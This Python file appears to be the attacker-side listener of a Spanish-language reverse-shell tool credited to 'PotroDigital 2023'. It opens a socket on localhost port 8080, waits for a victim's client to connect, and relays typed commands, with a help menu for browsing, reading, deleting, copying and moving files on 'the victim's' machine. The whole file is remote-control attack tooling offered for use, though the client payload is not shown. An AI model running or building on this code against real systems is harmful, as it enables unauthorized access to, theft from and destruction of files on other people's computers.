import socket
import os
import re

print(
      f"""
          _-_-_-_-_-_-_-_-_-_-_-_       ~~~~~~~~~~~~~~~~~~~~~~
          |                     |       |                     \\
          |                     |       |                      \\
          |      _______        |       |     __________        |
          |      |      |       |       |     |         \       |
          |      |      |       |       |     |          |      |
          |      |______|       |       |     |          |      |
          |                     |       |     |          |      |
          |                     |       |     |          |      |
          |      _______________|       |     |          |      |
          |      |                      |     |          |      |    
          |      |                      |     |          |      |
          |      |                      |     |_________ /      | 
          |      |                      |                       |
          |      |                      |                      //
          |______|                      |~~~~~~~~~~~~~~~~~~~~~//\n\n""")

print('\t-------------------------------------------------------------------------------------------\n')
print('\t   [+] Info: Obtener una Reverse Shell a través de un servidor. Autor. PotroDigital 2023\n')
print('\t-------------------------------------------------------------------------------------------\n\n')

host = "localhost"
port = 8080

buffer_size = 15 * 1024
s = socket.socket()

s.bind((host, int(port)))
s.listen(1)

print('\n')
print(f'\tEsperando Receptor \t\t  Host: {host} \t Puerto: {port}')

client_socket, client_address = s.accept()

print('\n\t\t###### CONEXIÓN EXITOSA ######\n')
print('\t--------------------------------------------------\n')
print(f"{client_address[0]}:{client_address[1]} Conectado")

print('\n')
print('\t--------------------------------------------------\n')
print('\t\t ____________ Ejemplos de comandos: ____________\n\n')
print('''
        \t [+] dir: lista los archivos del directorio de la víctima (si no funciona utilice ls)\n
        \t--------------------------------------------------\n
        \t [+] ls: lo mismo que dir (si no funciona utilice dir)\n
        \t--------------------------------------------------\n
        \t [+] pwd: muestra la dirección del directorio en el que está actualmente\n
        \t--------------------------------------------------\n
        \t [+] usr: nombre del usuario \n
        \t--------------------------------------------------\n
        \t [+] open (nombre del archivo): muestra lo que contiene un archivo\n
        \t--------------------------------------------------\n
        \t [+] delete (nombre del archivo): elimina el archivo\n
        \t--------------------------------------------------\n
        \t [+] create (nombre del archivo con su extensión) text (Texto del archivo): crea un archivo con texto\n
        \t--------------------------------------------------\n
        \t [+] copy (nombre del archivo o carpeta) a (nuevo archivo o carpeta): copia un archivo o carpeta\n
        \t--------------------------------------------------\n
        \t [+] rename (nombre del archivo o carpeta) a (nuevo nombre del archivo o carpeta): renombra un archivo o carpeta\n
        \t--------------------------------------------------\n
        \t [+] mkdir (nombre de la carpeta): crea una carpeta en el directorio de la víctima
        \t--------------------------------------------------\n
        \t [+] cd (nombre de la carpeta): permite moverse entre directorios
        \t--------------------------------------------------\n
        \t [+] move (nombre del archivo o carpeta) a (directorio): permite mover archivos o carpetas a otros directorios
        \t--------------------------------------------------\n
        \t [+] rename (nombre del archivo o carpeta) a (nuevo nombre): renombra la carpeta o archivo
        \t--------------------------------------------------\n
        \t [+] exit: permite desconectarse del servidor
        ''')

while True:
    command = input('\t\t~ $ ')
    client_socket.send(command.encode())
    
    if command.lower() == 'exit':
        print('Desconectado')
        client_socket.close()
        s.close()
        break
    result = client_socket.recv(buffer_size).decode()
    print(result)